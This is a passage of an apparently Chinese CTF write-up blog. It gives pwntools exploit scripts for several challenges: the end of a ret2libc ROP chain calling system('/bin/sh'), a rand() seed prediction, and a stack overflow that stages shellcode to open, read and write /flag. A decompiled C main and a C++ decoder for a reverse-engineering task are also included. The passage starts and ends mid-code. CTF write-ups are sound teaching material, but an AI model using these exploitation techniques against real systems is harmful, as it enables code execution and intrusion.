class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>, puts_addr)<br>libc_base = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>sys_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bsh_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>io.sendline(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment"># 说实在的这个也没用上</span><br>io.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">18</span>+p64(ret)+p64(prdir)+p64(bsh_addr)+p64(sys_addr))<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="真男人下120层"><a href="#真男人下120层" class="headerlink" title="真男人下120层"></a>真男人下120层</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+8h] [rbp-18h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  __int64 v8; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v9; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v9 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setbuf(_bss_start, <span class="hljs-number">0LL</span>);<br>  v3 = time(<span class="hljs-number">0LL</span>);<br>  srand(v3);<br>  v8 = <span class="hljs-number">2772839826LL</span>;<br>  v4 = rand();<br>  srand(v4 % <span class="hljs-number">3</span> - <span class="hljs-number">1522127470</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\x1B[31m&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\n&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot; ##   ## #######  ####### ######## ####### &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot; ##   ##     ###  ##         ##    ##      &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot; #######   ###    ##         ##    ####    &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot; ##   ## ###      ##         ##    ##      &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot; ##   ## #######  #######    ##    ##      \n\n&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\x1B[0m&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(aThereAreFourDo);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Only one door leads to the right path. If you choose the wrong one, you will be killed by a trap.\n&quot;</span>);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">1</span>; (<span class="hljs-type">int</span>)i &lt;= <span class="hljs-number">120</span>; ++i )<br>  &#123;<br>    print_door();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\t\t\tFloor %d\n\n&quot;</span>, i);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v6);<br>    <span class="hljs-keyword">if</span> ( rand() % <span class="hljs-number">4</span> + <span class="hljs-number">1</span> != v6 )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\x1B[31m&quot;</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;YOU DIED!&quot;</span>);<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\x1B[0m&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    system(<span class="hljs-string">&quot;clear&quot;</span>);<br>  &#125;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Congratulation!&quot;</span>);<br>  cat_flag();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<span class="hljs-comment">// main</span><br></code></pre></td></tr></table></figure><p>纯纯的模拟题，没什么考点。</p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>io = process(<span class="hljs-string">&#x27;./bin&#x27;</span>)<br><br>lib = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br>srand=lib.srand(lib.time(<span class="hljs-number">0</span>))<br>srand=lib.srand(srand%<span class="hljs-number">3</span>-<span class="hljs-number">1522127470</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;Floor&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">121</span>):<br>    io.sendline(<span class="hljs-built_in">str</span>(lib.rand()%<span class="hljs-number">4</span>+<span class="hljs-number">1</span>).encode())<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h2><p>main一个随机一个对\n sendline的检查，vulnerable一个栈可溢出点，可是做题经验不是很足，以为是orw+栈迁移但没做明白，后面重新按师傅的来顺了一遍，执行流还是得看调试。因不复杂，反编译内容在此不表。</p><h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>context.binary = <span class="hljs-string">&#x27;./rd&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>io = process(<span class="hljs-string">&#x27;./rd&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./rd&#x27;</span>, <span class="hljs-literal">False</span>)<br>libc = cdll.LoadLibrary(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br>srand = libc.srand(libc.time(<span class="hljs-number">0</span>))<br>io.sendline(<span class="hljs-built_in">str</span>(libc.rand()%<span class="hljs-number">50</span>).encode())<br><br>read_code = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">            mov r14, r13</span><br><span class="hljs-string">            mov r15, r13</span><br><span class="hljs-string">            /* r13 -&gt; rsp */</span><br><span class="hljs-string">            xor rdi, rdi</span><br><span class="hljs-string">            /* ARG0 -&gt; rdi -&gt; fd */</span><br><span class="hljs-string">            push r14</span><br><span class="hljs-string">            pop rsi</span><br><span class="hljs-string">            /* ARG1 -&gt; rsi = r13 = rsp */</span><br><span class="hljs-string">            push 0x100</span><br><span class="hljs-string">            pop rdx</span><br><span class="hljs-string">            /* ARG2 -&gt; rdx = 0x100 */</span><br><span class="hljs-string">            xor rax, rax</span><br><span class="hljs-string">            syscall</span><br><span class="hljs-string">            /* read(0, rsp, 0x100) */</span><br><span class="hljs-string"></span><br><span class="hljs-string">            push r15</span><br><span class="hljs-string">            pop rsp</span><br><span class="hljs-string">            jmp rsp</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>read_sc = asm(read_code)<br>sub_rsp = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">          sub rsp, 0x30</span><br><span class="hljs-string">          jmp rsp</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>sub_jmp = asm(sub_rsp)<br>jmp_rsp = <span class="hljs-number">0x40094E</span><br>payload = read_sc + cyclic(<span class="hljs-number">0x28</span>-<span class="hljs-built_in">len</span>(read_sc)) + p64(jmp_rsp) + sub_jmp<br>io.sendlineafter(<span class="hljs-string">b&#x27;door\n&#x27;</span>, payload)<br><br>orw_code  = shellcraft.<span class="hljs-built_in">open</span> (<span class="hljs-string">&#x27;/flag&#x27;</span>)<br>orw_code += shellcraft.read (<span class="hljs-number">3</span>, <span class="hljs-number">0x601f00</span>, <span class="hljs-number">0x30</span>)<br>orw_code += shellcraft.write(<span class="hljs-number">1</span>, <span class="hljs-number">0x601f00</span>, <span class="hljs-number">0x30</span>)<br>io.sendline(asm(orw_code))<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="Check-Your-Luck"><a href="#Check-Your-Luck" class="headerlink" title="Check_Your_Luck"></a>Check_Your_Luck</h2><p>就是纯纯的逆向，逆着来就行。js代码不需要看得懂，就看得懂concat是类似于C++ vector的push_back就够用了，或者python的append也行，字符串直接用+当然也可以，反正就是纯纯的语义逆向，没有算数语法什么的。</p><h3 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dec</span><span class="hljs-params">()</span> </span>&#123;<br>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>string sc = <span class="hljs-string">&quot;+&#125;!q\&quot;)hiim)#&#125;-nvm)i-$#mvn#0mnbm)im#n+&#125;!qnm8)i-$#mvnoc#0nz&lt;$9inm!&gt;-n1:1-nm8)i-$~c58n!&#125;qhij#0[noic##m8nc8n?!8c&#125;w!n]&gt;&amp;&quot;</span>;<br>string s&#123;&#125;;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; sc.<span class="hljs-built_in">length</span>(); i++) &#123;<br><span class="hljs-keyword">switch</span>(sc[i]) &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;!&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;a&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;1&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;b&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;)&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;c&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;v&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;d&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;m&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;e&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;+&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;f&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;q&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;g&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;0&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;h&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;c&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;i&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;]&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;j&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;(&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;k&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;&#125;&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;l&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;[&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;m&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;8&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;n&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;5&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;0&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;$&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;p&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;*&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;q&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;i&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;r&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;&gt;&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;s&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;#&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;t&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;&lt;&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;u&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;?&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;v&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;o&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;w&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;^&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;x&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;-&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;y&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;_&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;z&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;h&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;0&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;w&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;1&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;e&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;2&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;9&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;3&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;g&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;4&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;z&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;5&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;d&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;6&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;~&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;7&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;=&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;8&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;x&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;9&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;j&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;!&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;:&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;@&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;4&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;#&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;$&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;`&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;%&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;l&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;^&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;3&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;&amp;&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;t&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;*&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;6&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;(&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;)&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;n&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;_&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;;&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;+&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\&#x27;&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;-&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;r&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;=&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;k&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;`&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;p&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;~&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;\&quot;&#x27;</span>:<br>s.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;&#123;&#x27;</span>);<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;&amp;&#x27;</span>:<br>s.<span 